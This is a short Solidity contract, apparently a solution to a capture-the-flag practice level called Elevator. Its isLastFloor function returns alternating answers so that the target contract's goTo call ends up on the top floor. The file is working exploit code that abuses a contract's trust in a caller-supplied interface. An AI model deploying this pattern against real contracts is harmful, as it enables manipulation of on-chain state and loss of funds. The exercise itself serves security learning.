// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Elevator {
    function goTo(uint256) external;
}

contract ElevatorAttack {
    uint256 timesCalled;

    function attack(address elevatorAddress) external {
        Elevator(elevatorAddress).goTo(0);
    }

    function isLastFloor(uint256) external returns (bool) {
        timesCalled++;
        if (timesCalled % 2 == 0) return true;
        else return false;
    }
}
